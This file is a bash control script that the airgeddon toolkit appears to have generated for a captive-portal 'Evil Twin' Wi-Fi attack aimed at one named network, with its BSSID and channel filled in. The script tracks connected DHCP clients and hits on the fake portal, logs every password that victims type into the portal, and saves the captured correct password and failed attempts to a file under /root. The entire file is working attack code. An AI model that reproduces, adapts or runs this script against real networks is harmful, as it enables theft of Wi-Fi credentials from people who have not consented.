#!/usr/bin/env bash
et_heredoc_mode="et_captive_portal"
path_to_processes="/tmp/ag1/ag.et_processes.txt"
path_to_channelfile="/tmp/ag1/ag.et_channel.txt"
mdk_command="mdk4"

function kill_pid_and_children_recursive() {

local parent_pid=""
local child_pids=""

parent_pid="${1}"
child_pids=$(pgrep -P "${parent_pid}" 2> /dev/null)

for child_pid in ${child_pids}; do
kill_pid_and_children_recursive "${child_pid}"
done
if [ -n "${child_pids}" ]; then
pkill -P "${parent_pid}" &> /dev/null
fi

kill "${parent_pid}" &> /dev/null
wait "${parent_pid}" 2> /dev/null
}

function kill_et_processes_control_script() {

readarray -t ET_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
for item in "${ET_PROCESSES_TO_KILL[@]}"; do
kill_pid_and_children_recursive "${item}"
done
}

if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
attempts_path="/tmp/ag1/www/ag.et_attempts.txt"
attempts_text="\033[1;34mAttempts:\e[1;0m"
last_password_msg="\033[1;34mlast password:\e[1;0m"
function finish_evil_twin() {

echo "" > "/root/evil_twin_captive_portal_password-Mulyadi Wader.txt"
date +%Y-%m-%d >>\
"/root/evil_twin_captive_portal_password-Mulyadi Wader.txt"
{
echo "airgeddon. Captive portal Evil Twin attack captured password"
echo ""
echo "BSSID: 14:4D:67:2E:2E:78"
echo "Channel: 13"
echo "ESSID: Mulyadi Wader"
echo ""
echo "---------------"
echo ""
} >> "/root/evil_twin_captive_portal_password-Mulyadi Wader.txt"
success_pass_path="/tmp/ag1/www/ag.et_currentpass.txt"
msg_good_pass="Password:"
log_path="/root/evil_twin_captive_portal_password-Mulyadi Wader.txt"
log_reminder_msg="\033[1;35mThe password was saved on file: [\e[1;0m/root/evil_twin_captive_portal_password-Mulyadi Wader.txt\033[1;35m]\e[1;0m"
done_msg="\033[1;33mPress [Enter] on the main script window to continue, this window will be closed\e[1;0m"
echo -e "\t\033[1;34mPassword captured successfully:\e[1;0m"
echo
echo "${msg_good_pass} $( (cat < ${success_pass_path}) 2> /dev/null)" >> "${log_path}"
attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
et_password=$( (cat < ${success_pass_path}) 2> /dev/null)
echo -e "\t${et_password}"
echo
echo -e "\t${log_reminder_msg}"
echo
echo -e "\t${done_msg}"
if [ "${attempts_number}" -gt 0 ]; then
{
echo ""
echo "---------------"
echo ""
echo "Captured passwords on failed attempts:"
echo ""
} >> "/root/evil_twin_captive_portal_password-Mulyadi Wader.txt"
readarray -t BADPASSWORDS < <(cat < "/tmp/ag1/www/ag.et_attempts.txt" 2> /dev/null)
for badpass in "${BADPASSWORDS[@]}"; do
echo "${badpass}" >>\
"/root/evil_twin_captive_portal_password-Mulyadi Wader.txt"
done
fi

{
echo ""
echo "---------------"
echo ""
echo "If you enjoyed the script and found it useful, you can support the project by making a donation. Through PayPal (v1s1t0r.1s.h3r3@gmail.com) or sending a fraction of cryptocurrency (Bitcoin, Ethereum, Litecoin...). Any amount, no matter how small (1, 2, 5 $/€) is welcome. More information and direct links to do it at: https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Contributing"
} >> "/root/evil_twin_captive_portal_password-Mulyadi Wader.txt"

sleep 2
kill_et_processes_control_script
exit 0
}
fi
date_counter=$(date +%s)
while true; do
et_control_window_channel=$(cat "${path_to_channelfile}" 2> /dev/null)
echo -e "\t\033[1;33mEvil Twin AP Info \e[1;97m// \033[1;34mBSSID: \e[1;0m14:4D:67:2E:2E:78 \033[1;33m// \033[1;34mChannel: \e[1;0m${et_control_window_channel} \033[1;33m// \033[1;34mESSID: \e[1;0mMulyadi Wader"
echo
echo -e "\t\033[1;32mOnline time\e[1;0m"
hours=$(date -u --date @$(($(date +%s) - date_counter)) +%H)
mins=$(date -u --date @$(($(date +%s) - date_counter)) +%M)
secs=$(date -u --date @$(($(date +%s) - date_counter)) +%S)
echo -e "\t${hours}:${mins}:${secs}"
echo -e "\t\033[1;35mOn this attack, we'll wait for a network client to provide us the password for the wifi network in our captive portal\e[1;0m\n"
if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
if [ -f "/tmp/ag1/www/ag.et_success.txt" ]; then
clear
echo -e "\t\033[1;33mEvil Twin AP Info \e[1;97m// \033[1;34mBSSID: \e[1;0m14:4D:67:2E:2E:78 \033[1;33m// \033[1;34mChannel: \e[1;0m13 \033[1;33m// \033[1;34mESSID: \e[1;0mMulyadi Wader"
echo
echo -e "\t\033[1;32mOnline time\e[1;0m"
echo -e "\t${hours}:${mins}:${secs}"
echo
finish_evil_twin
else
attempts_number=$( (cat < "${attempts_path}" | wc -l) 2> /dev/null)
last_password=$(grep "." ${attempts_path} 2> /dev/null | tail -1)
tput el && echo -ne "\t${attempts_text} ${attempts_number}"
if [ "${attempts_number}" -gt 0 ]; then
open_parenthesis="\033[1;33m(\e[1;0m"
close_parenthesis="\033[1;33m)\e[1;0m"
echo -ne " ${open_parenthesis} ${last_password_msg} ${last_password} ${close_parenthesis}"
fi
fi
echo
echo
fi
echo -e "\t\033[1;32mDHCP ips given to possible connected clients\e[1;0m"
readarray -t DHCPCLIENTS < <(grep DHCPACK < "/tmp/ag1/clts.txt")
client_ips=()
if [[ -z "${DHCPCLIENTS[@]}" ]]; then
echo -e "\tNo clients connected yet"
else
for client in "${DHCPCLIENTS[@]}"; do
[[ ${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="${BASH_REMATCH[1]}" && client_mac="${BASH_REMATCH[2]}"
if [[ " ${client_ips[*]} " != *" ${client_ip} "* ]]; then
client_hostname=""
[[ ${client} =~ .*(\(.+\)).* ]] && client_hostname="${BASH_REMATCH[1]}"
if [[ -z "${client_hostname}" ]]; then
echo -ne "\t${client_ip} ${client_mac}"
else
echo -ne "\t${client_ip} ${client_mac} ${client_hostname}"
fi
if [ "0" -eq 1 ]; then
if arping -C 3 -I "ireng" -w 5 -p -q "${client_ip}"; then
echo -ne " \033[1;34mIs alive\033[1;32m ✓\e[1;0m"
else
echo -ne " \033[1;34mIs alive\033[1;31m ✘\e[1;0m"
fi
fi
if [ "${et_heredoc_mode}" = "et_captive_portal" ]; then
if grep -qE "^${client_ip} 200 GET /pixel.png" "/tmp/ag1/ag.lighttpd.log" > /dev/null 2>&1; then
echo -ne " \033[1;34mPortal accessed\033[1;32m ✓\e[1;0m"
else
echo -ne " \033[1;34mPortal accessed\033[1;31m ✘\e[1;0m"
fi
fi
echo -ne "\n"
fi
client_ips+=(${client_ip})
done
fi
echo -ne "\033[K\033[u"
sleep 1
current_window_size="$(tput cols)x$(tput lines)"
if [ "${current_window_size}" != "${stored_window_size}" ]; then
stored_window_size="${current_window_size}"
clear
fi
done
